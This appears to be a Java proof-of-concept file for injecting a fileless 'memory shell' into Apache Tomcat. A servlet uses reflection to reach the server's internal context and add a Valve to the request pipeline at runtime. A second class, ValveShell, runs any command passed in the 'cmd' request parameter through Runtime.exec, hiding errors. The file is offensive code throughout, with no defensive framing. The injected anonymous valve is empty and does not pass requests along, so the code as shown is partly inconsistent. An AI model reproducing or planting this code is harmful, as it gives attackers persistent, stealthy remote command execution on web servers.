package tomcatShell.Servlet;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

public class ValveShell_Servlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field FieldReq = req.getClass().getDeclaredField("request");
            FieldReq.setAccessible(true);
            Request request = (Request) FieldReq.get(req);
            StandardContext standardContext = (StandardContext) request.getContext();
            standardContext.getPipeline().addValve(new ValveBase() {
                @Override
                public void invoke(Request request, Response response) throws IOException, ServletException {

                }
            });
            resp.getWriter().write("inject success");
        } catch (Exception e) {
        }
    }
}

class ValveShell extends ValveBase{

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("111");
        try {
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        } catch (Exception e) {

        }
    }
}
